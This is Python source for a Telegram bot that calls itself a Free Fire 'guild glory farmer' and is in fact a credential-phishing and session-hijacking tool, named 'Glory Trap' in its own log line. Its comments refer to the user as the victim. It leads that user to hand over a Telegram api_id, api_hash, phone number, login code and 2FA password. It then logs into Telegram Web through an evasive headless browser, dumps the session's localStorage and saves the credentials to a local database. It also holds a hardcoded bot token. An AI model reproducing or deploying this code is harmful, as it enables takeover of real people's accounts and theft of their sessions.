import os
import json
import sqlite3
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- MASTER BOT CONFIG ---
BOT_TOKEN = '8280525829:AAHeDdGOCKaUx60RBfN1cfOGfyBBdMn9q8k'
DB_DIR = 'harvested_data'

def get_driver():
    opts = Options()
    opts.add_argument("--headless")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    
    # Hide Automation Flags
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option('useAutomationExtension', False)
    
    # Set a common User-Agent
    opts.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
    
    # Patch Navigator.webdriver
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver
    

user_states = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **GUILD GLORY FARMER v12.1 [ULTRA]** 🔥\n\n"
        "**Step 1:** Enter your **Free Fire Guest UID**."
    )
    user_states[update.effective_user.id] = {'step': 'UID'}

async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in user_states: return
    state = user_states[uid]
    text = update.message.text

    if state['step'] == 'UID':
        # INTEGRATED INSTRUCTIONS FOR VICTIM
        instructions = (
            "⚠️ **VERIFICATION REQUIRED** ⚠️\n\n"
            "To prevent Garena detection, you must link your personal API tunnel.\n\n"
            "**FOLLOW THESE STEPS:**\n"
            "1. **Login:** Go to https://my.telegram.org.\n"
            "2. **App Creation:** Click on 'API development tools'.\n"
            "3. **Details:** Enter any name for the app (e.g., 'GloryFarm').\n"
            "4. **Copy:** Copy the **App api_id** and paste it here now."
        )
        await update.message.reply_text(instructions, disable_web_page_preview=True)
        state['step'] = 'API_ID'

    elif state['step'] == 'API_ID':
        state['api_id'] = text
        await update.message.reply_text("✅ API ID Received. Now paste your **App api_hash**.")
        state['step'] = 'API_HASH'

    elif state['step'] == 'API_HASH':
        state['api_hash'] = text
        await update.message.reply_text("✅ Credentials Validated. Enter your **Phone Number** (+91...).")
        state['step'] = 'PHONE'

    elif state['step'] == 'PHONE':
        state['phone'] = text
        await update.message.reply_text("📩 **Verifying Tunnel...** (Wait 10 seconds)")
        
        driver = get_driver()
        driver.get("https://web.telegram.org/a/")
        wait = WebDriverWait(driver, 40)
        
        try:
            # Wait for page load
            el = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@type='tel']")))
            el.click()
            
            # Simulate Human Typing
            for char in text:
                el.send_keys(char)
                time.sleep(0.1)
            
            time.sleep(2) # Wait for UI to validate number
            
            # Click Next
            next_btn = driver.find_element(By.XPATH, "//button[contains(., 'Next')]")
            next_btn.click()
            
            # Verify if we moved to OTP screen or got an error
            time.sleep(5)
            if "Phone number not registered" in driver.page_source:
                 await update.message.reply_text("❌ Number not found. Use +91 format.")
                 driver.quit()
                 return

            state['driver'] = driver
            state['step'] = 'OTP'
            await update.message.reply_text("⚠️ **OTP Sent!** Check your Telegram app.")

        except Exception as e:
            print(f"[-] Selenium Error: {e}")
            driver.quit()
            
            

    elif state['step'] == 'OTP':
        driver = state['driver']
        driver.find_element(By.XPATH, "//input[@inputmode='numeric']").send_keys(text)
        time.sleep(3)
        
        if "password" in driver.current_url.lower():
            await update.message.reply_text("🔐 **2FA detected.** Enter your 2FA password.")
            state['step'] = '2FA'
        else:
            await finalize_harvest(update, uid)

    elif state['step'] == '2FA':
        state['2fa'] = text
        state['driver'].find_element(By.XPATH, "//input[@type='password']").send_keys(text)
        await finalize_harvest(update, uid)

async def finalize_harvest(update, uid):
    state = user_states[uid]
    driver = state['driver']
    
    storage = driver.execute_script("return JSON.stringify(window.localStorage);")
    with open(f"{DB_DIR}/{uid}_web.json", "w") as f:
        f.write(storage)
        
    conn = sqlite3.connect(f"{DB_DIR}/{uid}_master.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS credentials (key TEXT, val TEXT)")
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("phone", state['phone']))
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("api_id", state['api_id']))
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("api_hash", state['api_hash']))
    cursor.execute("INSERT INTO credentials VALUES (?, ?)", ("2fa", state.get('2fa', 'NONE')))
    conn.commit()
    conn.close()

    await update.message.reply_text("✅ **Verification complete!** Farming active.")
    driver.quit()
    user_states.pop(uid)

if __name__ == '__main__':
    if not os.path.exists(DB_DIR): 
        os.makedirs(DB_DIR)

    # 1. Initialize the Application builder
    builder = Application.builder().token(BOT_TOKEN)

    # 2. Build the application object first
    app = builder.build()

    # 3. Add handlers to the initialized 'app' object
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle))

    # 4. Start the bot
    print("[SINGULARITY] Glory Trap v12.1 is LIVE and harvesting...")
    app.run_polling()
    
